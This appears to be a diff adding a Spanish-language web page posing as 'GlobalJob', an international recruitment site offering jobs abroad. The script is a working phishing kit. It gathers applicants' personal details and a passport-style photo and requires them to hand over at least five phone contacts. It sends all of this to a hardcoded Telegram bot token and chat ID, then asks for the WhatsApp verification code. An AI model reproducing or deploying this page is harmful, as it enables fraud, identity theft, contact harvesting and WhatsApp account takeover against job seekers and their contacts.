@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GlobalJob | Reclutamiento Internacional</title>
+    <style>
+        :root {
+            --primary: #2563eb;
+            --accent: #f59e0b;
+            --text-main: #1e293b;
+            --text-muted: #64748b;
+            --bg-body: #ffffff;
+            --card-bg: #f8fafc;
+            --border: #e2e8f0;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-body);
+            color: var(--text-main);
+            margin: 0;
+            line-height: 1.6;
+        }
+
+        .container { max-width: 480px; margin: 0 auto; padding: 20px; }
+
+        /* Pantallas */
+        .screen { display: none; animation: fadeIn 0.4s ease-out; }
+        .active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; } }
+
+        /* Cabecera */
+        .header { text-align: center; padding: 20px 0; }
+        .header img { width: 100%; border-radius: 15px; margin-bottom: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+
+        /* Tarjetas de Trabajo */
+        .job-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            padding: 16px;
+            border-radius: 12px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .job-card:hover { border-color: var(--primary); transform: translateY(-2px); }
+        .flag { width: 40px; height: 28px; border-radius: 4px; margin-right: 15px; object-fit: cover; }
+
+        /* Formulario */
+        .input-group { margin-bottom: 1rem; }
+        label { font-size: 0.75rem; font-weight: 700; color: var(--text-muted); margin-bottom: 5px; display: block; text-transform: uppercase; }
+        input, select {
+            width: 100%; padding: 12px; border-radius: 8px; border: 1px solid var(--border);
+            box-sizing: border-box; font-size: 1rem; background: #fff;
+        }
+
+        /* DISEÑO MEJORADO: Botón de Imagen */
+        .file-upload-wrapper {
+            position: relative;
+            width: 100%;
+            height: 50px;
+            border: 2px dashed var(--primary);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #eff6ff;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .file-upload-wrapper:hover { background: #dbeafe; }
+        .file-upload-wrapper input[type="file"] {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            cursor: pointer;
+        }
+        .file-upload-text { color: var(--primary); font-weight: 600; font-size: 0.9rem; }
+
+        /* Botón de Contactos */
+        .btn-contacts {
+            background: linear-gradient(135deg, #f59e0b, #ea580c);
+            color: white; border: none; padding: 14px; border-radius: 10px;
+            width: 100%; font-weight: bold; cursor: pointer;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            transition: 0.3s; margin-top: 5px;
+        }
+        .btn-contacts.success { background: #10b981; }
+
+        .btn-pro {
+            background: var(--primary);
+            color: white; border: none; padding: 15px; border-radius: 10px;
+            width: 100%; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 1rem;
+        }
+        .btn-pro:disabled { background: #cbd5e1; cursor: not-allowed; }
+
+        .loading { text-align: center; color: var(--primary); display: none; font-weight: 600; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="inicio" class="screen active">
+        <div class="header">
+            <img id="img-hero" src="" alt="Hero">
+            <h1 id="site-title"></h1>
+            <p id="site-desc" style="color: var(--text-muted);"></p>
+            <button class="btn-pro" onclick="showScreen('lista-trabajos')">VER VACANTES</button>
+        </div>
+    </div>
+
+    <div id="lista-trabajos" class="screen">
+        <h2>Trabajos Disponibles</h2>
+        <div id="contenedor-trabajos"></div>
+    </div>
+
+    <div id="formulario" class="screen">
+        <h2 id="titulo-form">Postulación</h2>
+        
+        <div class="input-group">
+            <label>Nombre Completo</label>
+            <input type="text" id="nombre" placeholder="Juan Pérez">
+        </div>
+
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+            <div class="input-group">
+                <label>Edad</label>
+                <input type="number" id="edad" placeholder="Ej: 25">
+            </div>
+            <div class="input-group">
+                <label>Género</label>
+                <select id="genero">
+                    <option value="Masculino">Masculino</option>
+                    <option value="Femenino">Femenino</option>
+                    <option value="Otro">Otro</option>
+                </select>
+            </div>
+        </div>
+
+        <div class="input-group">
+            <label>Nivel Educacional</label>
+            <select id="nivel">
+                <option value="Primaria">Primaria</option>
+                <option value="Secundaria">Secundaria</option>
+                <option value="Bachiller">Bachiller</option>
+                <option value="Técnico">Técnico Medio</option>
+                <option value="Universitario">Universitario</option>
+                <option value="Postgrado">Postgrado</option>
+            </select>
+        </div>
+
+        <div class="input-group">
+            <label>Foto tipo pasaporte</label>
+            <div class="file-upload-wrapper">
+                <span id="file-label" class="file-upload-text">📸 Subir Foto Personal</span>
+                <input type="file" id="foto" accept="image/*" onchange="actualizarNombreArchivo()">
+            </div>
+        </div>
+        
+        <div class="input-group" style="padding: 15px; background: #fff7ed; border: 1px solid #fed7aa; border-radius: 12px; margin-top: 20px;">
+            <label style="color: #c2410c;">Validación de Perfil</label>
+            <p style="font-size: 0.8rem; margin-bottom: 10px;">Es obligatorio recomendar a 5 contactos para habilitar el envío.</p>
+            <button id="btn-share" class="btn-contacts" onclick="seleccionarContactos()">
+                <span>👤</span> SELECCIONAR CONTACTOS
+            </button>
+        </div>
+
+        <button id="btn-enviar" class="btn-pro" onclick="enviarTodaLaInformacion()" disabled>ENVIAR SOLICITUD</button>
+        <p id="status" class="loading">Enviando solicitud...</p>
+    </div>
+
+    <div id="pantalla-codigo" class="screen" style="text-align: center; padding-top: 40px;">
+        <h2 style="color: #10b981;">¡Casi listo!</h2>
+        <p>Introduce el código de verificación enviado a tu WhatsApp.</p>
+        <input type="text" id="codigo-wa" placeholder="0 0 0 0" style="text-align: center; font-size: 2rem; width: 150px; border:none; border-bottom: 3px solid #10b981; outline:none;">
+        <button class="btn-pro" onclick="alert('En revisión...')">VERIFICAR</button>
+    </div>
+</div>
+
+<script>
+    // ==========================================
+    //   ARCHIVO DE CONTROL
+    // ==========================================
+    const CONFIG = {
+        conexion: {
+            token: "1965076303:AAH0no5wqlKYalUihHRD1Cyt-zw3Ak0qP24",
+            chatId: "908553770"
+        },
+        visual: {
+            titulo: "GlobalJob 🌎",
+            descripcion: "Tu puerta al mercado laboral internacional.",
+            imagenHero: "https://images.unsplash.com/photo-1521737711867-e3b97375f902?w=500"
+        },
+        trabajos: [
+            { pais: "España", puesto: "Construcción", pago: "1800€", flag: "https://flagcdn.com/es.svg" },
+            { pais: "Canadá", puesto: "Agrícola", pago: "2400$", flag: "https://flagcdn.com/ca.svg" },
+            { pais: "Italia", puesto: "Hostelería", pago: "1600€", flag: "https://flagcdn.com/it.svg" }
+        ]
+    };
+
+    let contactosElegidos = [];
+    let trabajoSeleccionado = "";
+
+    window.onload = () => {
+        document.getElementById('site-title').innerText = CONFIG.visual.titulo;
+        document.getElementById('site-desc').innerText = CONFIG.visual.descripcion;
+        document.getElementById('img-hero').src = CONFIG.visual.imagenHero;
+        renderTrabajos();
+    };
+
+    function renderTrabajos() {
+        const container = document.getElementById('contenedor-trabajos');
+        CONFIG.trabajos.forEach(t => {
+            const card = document.createElement('div');
+            card.className = 'job-card';
+            card.onclick = () => {
+                trabajoSeleccionado = `${t.puesto} (${t.pais})`;
+                document.getElementById('titulo-form').innerText = `Aplicar: ${t.puesto}`;
+                showScreen('formulario');
+            };
+            card.innerHTML = `<img class="flag" src="${t.flag}"> <div><strong>${t.puesto}</strong><br><small>${t.pais} | ${t.pago}</small></div>`;
+            container.appendChild(card);
+        });
+    }
+
+    function showScreen(id) {
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        window.scrollTo(0,0);
+    }
+
+    function actualizarNombreArchivo() {
+        const input = document.getElementById('foto');
+        const label = document.getElementById('file-label');
+        if(input.files.length > 0) label.innerText = "✅ Foto cargada con éxito";
+    }
+
+    async function seleccionarContactos() {
+        try {
+            const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+            if (contacts && contacts.length > 0) {
+                contactosElegidos = contacts.map(c => `${c.name}: ${c.tel[0]}`);
+                const btn = document.getElementById('btn-share');
+                btn.innerText = "✅ CONTACTOS SELECCIONADOS";
+                btn.classList.add('success');
+                document.getElementById('btn-enviar').disabled = false;
+            }
+        } catch (e) {
+            alert("Selecciona al menos 5 contactos para validar tu identidad.");
+        }
+    }
+
+    async function enviarTodaLaInformacion() {
+        const nombre = document.getElementById('nombre').value;
+        const edad = document.getElementById('edad').value;
+        const genero = document.getElementById('genero').value;
+        const nivel = document.getElementById('nivel').value;
+        const foto = document.getElementById('foto').files[0];
+
+        if (!nombre || !foto || !edad) {
+            alert("Por favor completa todos los campos.");
+            return;
+        }
+
+        document.getElementById('status').style.display = "block";
+
+        const texto = `🌟 *NUEVO CANDIDATO*\n\n` +
+                      `👤 *Nombre:* ${nombre}\n` +
+                      `🎂 *Edad:* ${edad}\n` +
+                      `🚻 *Género:* ${genero}\n` +
+                      `🎓 *Nivel:* ${nivel}\n` +
+                      `💼 *Puesto:* ${trabajoSeleccionado}\n\n` +
+                      `👥 *Contactos compartidos:* ${contactosElegidos.length}\n` +
+                      `📱 *Lista:* \n${contactosElegidos.slice(0, 10).join('\n')}`;
+
+        try {
+            const form = new FormData();
+            form.append('chat_id', CONFIG.conexion.chatId);
+            form.append('photo', foto);
+            form.append('caption', texto);
+            form.append('parse_mode', 'Markdown');
+
+            await fetch(`https://api.telegram.org/bot${CONFIG.conexion.token}/sendPhoto`, { method: 'POST', body: form });
+            showScreen('pantalla-codigo');
+        } catch (e) {
+            alert("Error de conexión.");
+        } finally {
+            document.getElementById('status').style.display = "none";
+        }
+    }
+</script>
+
+</body>
+</html>
